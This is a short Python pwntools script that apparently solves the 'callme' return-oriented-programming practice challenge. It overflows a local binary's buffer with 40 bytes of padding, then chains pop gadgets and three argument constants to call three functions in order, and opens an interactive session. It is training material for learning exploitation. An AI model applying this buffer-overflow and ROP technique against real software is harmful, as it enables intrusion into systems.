from pwn import *

p = process("./callme")

callme_one = 0x00400720
callme_two = 0x00400740
callme_three = 0x004006f0

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

pop_rdi = 0x00000000004009a3
pop_rsi_rdx = 0x000000000040093d

payload = b"".join([
    b"A" * 40,
    p64(pop_rdi),
    p64(arg1),
    p64(pop_rsi_rdx),
    p64(arg2),
    p64(arg3),
    p64(callme_one),
    p64(pop_rdi),
    p64(arg1),
    p64(pop_rsi_rdx),
    p64(arg2),
    p64(arg3),
    p64(callme_two),
    p64(pop_rdi),
    p64(arg1),
    p64(pop_rsi_rdx),
    p64(arg2),
    p64(arg3),
    p64(callme_three),
])

p.recvuntil(b"> ")
p.send(payload)
p.interactive()
